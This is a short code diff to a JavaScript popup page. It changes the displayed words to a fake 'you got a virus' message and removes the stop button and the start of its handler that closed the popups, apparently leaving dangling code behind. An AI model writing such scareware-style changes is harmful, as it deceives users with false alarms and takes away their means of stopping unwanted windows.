@@ -32,7 +32,7 @@
     const music = new Audio('music.mp3');
     music.loop = true;
 
-    const wordlist = ['your', 'are', 'best', 'here :D'];
+    const wordlist = ['you', 'got', 'a', 'virus :D'];
     let index = 0;
     let nextAn = 1;
     let popups = [];
@@ -59,7 +59,7 @@
 
     function startMadness() {
       startBtn.style.display = 'none';
-      stopBtn.style.display = 'block';
+    
 
       const testPop = window.open('', '', 'width=200,height=100');
       if (!testPop) {
@@ -101,7 +101,7 @@
 
     startBtn.addEventListener('click', startMadness);
 
-    stopBtn.addEventListener('click', () => {
+    
       popups.forEach(p => {
         try { p.close(); } catch (e) {}
       });
